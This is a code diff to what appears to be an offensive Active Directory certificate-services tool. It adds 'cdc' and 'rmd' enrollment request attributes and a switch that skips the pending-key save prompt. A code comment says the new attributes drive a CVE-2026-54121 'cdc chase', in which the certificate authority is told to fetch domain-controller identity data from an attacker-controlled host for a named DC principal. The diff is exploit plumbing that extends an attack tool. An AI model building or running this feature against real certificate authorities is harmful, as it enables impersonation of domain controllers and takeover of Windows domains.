@@ -1072,7 +1072,8 @@ class DCOMRequestInterface:
             return result
 
         # Ask if the user wants to save the private key for pending requests
-        handle_pending_key_save(result, self.parent.key, self.parent.out)
+        if self.parent.prompt_for_pending_key:
+            handle_pending_key_save(result, self.parent.key, self.parent.out)
 
         return None
 
@@ -1228,7 +1229,8 @@ class RPCRequestInterface:
             return result
 
         # Ask if the user wants to save the private key for pending requests
-        handle_pending_key_save(result, self.parent.key, self.parent.out)
+        if self.parent.prompt_for_pending_key:
+            handle_pending_key_save(result, self.parent.key, self.parent.out)
 
         return None
 
@@ -1594,6 +1596,10 @@ class Request:
         http_port: Optional[int] = None,
         no_channel_binding: bool = False,
         dynamic_endpoint: bool = False,
+        cdc: Optional[str] = None,
+        rmd: Optional[str] = None,
+        additional_attributes: Optional[List[str]] = None,
+        prompt_for_pending_key: bool = True,
         **kwargs,  # type: ignore
     ):
         """
@@ -1670,6 +1676,18 @@ class Request:
         self.http_port = http_port
         self.http_scheme = http_scheme
         self.no_channel_binding = no_channel_binding
+
+        # Extra enrollment request attributes. cdc/rmd drive the CVE-2026-54121
+        # "cdc chase": the CA is told to fetch DC identity data from an
+        # attacker-controlled host (cdc) for the named DC principal (rmd).
+        request_attributes: List[str] = []
+        if cdc:
+            request_attributes.append(f"cdc:{cdc}")
+        if rmd:
+            request_attributes.append(f"rmd:{rmd}")
+        self.request_attributes = request_attributes
+        self.additional_attributes = additional_attributes or []
+        self.prompt_for_pending_key = prompt_for_pending_key
 
         # Handle default ports based on scheme
         if not self.http_port and self.http_scheme:
@@ -1860,6 +1878,7 @@ class Request:
             self.alt_upn,
             self.alt_sid,
             self.application_policies,
+            request_attributes=self.request_attributes + self.additional_attributes,
         )
 
         # Submit the certificate request
